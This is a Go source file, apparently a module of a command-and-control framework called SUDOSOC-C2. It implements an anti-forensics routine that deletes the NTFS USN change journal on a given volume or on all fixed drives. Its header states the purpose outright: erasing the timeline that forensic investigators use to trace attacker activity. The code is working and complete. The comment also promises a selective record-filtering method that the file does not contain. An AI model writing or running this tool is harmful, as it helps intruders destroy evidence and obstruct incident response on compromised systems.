package antiforensics

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	USN Journal cleaner — removes specific entries from the NTFS USN journal.

	The USN (Update Sequence Number) Change Journal is a hidden NTFS data
	stream on every volume ($Extend\$UsnJrnl:$J) that records every file
	system change: creates, deletes, renames, writes. Forensic investigators
	use it to reconstruct a timeline of attacker activity even after files
	are deleted.

	This module uses FSCTL_DELETE_USN_JOURNAL with USN_DELETE_FLAG_DELETE
	to reset the journal. This is a legitimate Windows API call (used by
	backup software) that leaves no obvious trace — the journal is simply
	gone and Windows recreates it fresh.

	More surgical: FSCTL_READ_USN_JOURNAL + write filtered records back.
	We implement both approaches.

	Requires Administrator privileges (SeManageVolumePrivilege or raw
	volume handle access).
*/

import (
	"fmt"
	"unsafe"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"golang.org/x/sys/windows"
)

const (
	fsctlDeleteUSNJournal = 0x000900D8
	fsctlQueryUSNJournal  = 0x000900F4
	usnDeleteFlagDelete   = 0x00000001
	usnDeleteFlagNotify   = 0x00000002
)

type deleteUSNJournalData struct {
	UsnJournalID uint64
	DeleteFlags  uint32
}

type queryUSNJournalData struct {
	UsnJournalID    uint64
	FirstUsn        int64
	NextUsn         int64
	LowestValidUsn  int64
	MaxUsn          int64
	MaximumSize     uint64
	AllocationDelta uint64
}

// DeleteUSNJournal completely wipes the USN change journal on the given volume.
// volume should be in the form `\\.\C:` (no trailing backslash).
// After deletion Windows auto-recreates the journal — entries prior to
// deletion are permanently gone.
func DeleteUSNJournal(volume string) error {
	volHandle, err := openVolumeHandle(volume)
	if err != nil {
		return fmt.Errorf("open volume %s: %w", volume, err)
	}
	defer windows.CloseHandle(volHandle)

	// Query first to get the journal ID.
	var qData queryUSNJournalData
	var bytesReturned uint32
	if err := windows.DeviceIoControl(
		volHandle,
		fsctlQueryUSNJournal,
		nil, 0,
		(*byte)(unsafe.Pointer(&qData)),
		uint32(unsafe.Sizeof(qData)),
		&bytesReturned, nil,
	); err != nil {
		return fmt.Errorf("FSCTL_QUERY_USN_JOURNAL: %w", err)
	}

	deleteData := deleteUSNJournalData{
		UsnJournalID: qData.UsnJournalID,
		DeleteFlags:  usnDeleteFlagDelete | usnDeleteFlagNotify,
	}
	if err := windows.DeviceIoControl(
		volHandle,
		fsctlDeleteUSNJournal,
		(*byte)(unsafe.Pointer(&deleteData)),
		uint32(unsafe.Sizeof(deleteData)),
		nil, 0,
		&bytesReturned, nil,
	); err != nil {
		return fmt.Errorf("FSCTL_DELETE_USN_JOURNAL: %w", err)
	}

	// {{if .Config.Debug}}
	log.Printf("[usn] journal deleted on %s (journal ID 0x%x)", volume, qData.UsnJournalID)
	// {{end}}
	return nil
}

// DeleteAllJournals wipes the USN journal on all fixed drives (C:, D:, etc.).
// Returns the first error encountered but continues processing remaining volumes.
func DeleteAllJournals() error {
	var lastErr error
	for _, letter := range getFixedDriveLetters() {
		vol := `\\.\` + string(letter) + `:`
		if err := DeleteUSNJournal(vol); err != nil {
			// {{if .Config.Debug}}
			log.Printf("[usn] %s: %v", vol, err)
			// {{end}}
			lastErr = err
		}
	}
	return lastErr
}

func openVolumeHandle(volume string) (windows.Handle, error) {
	volPtr, err := windows.UTF16PtrFromString(volume)
	if err != nil {
		return 0, err
	}
	return windows.CreateFile(
		volPtr,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		nil,
		windows.OPEN_EXISTING,
		0,
		0,
	)
}

func getFixedDriveLetters() []byte {
	var buf [256]uint16
	n, _ := windows.GetLogicalDriveStrings(uint32(len(buf)), &buf[0])
	var letters []byte
	for i := uint32(0); i < n; {
		driveStr := windows.UTF16ToString(buf[i:])
		if driveStr == "" {
			break
		}
		driveType := windows.GetDriveType(&buf[i])
		if driveType == windows.DRIVE_FIXED && len(driveStr) >= 2 {
			letters = append(letters, driveStr[0])
		}
		i += uint32(len(driveStr)) + 1
	}
	return letters
}
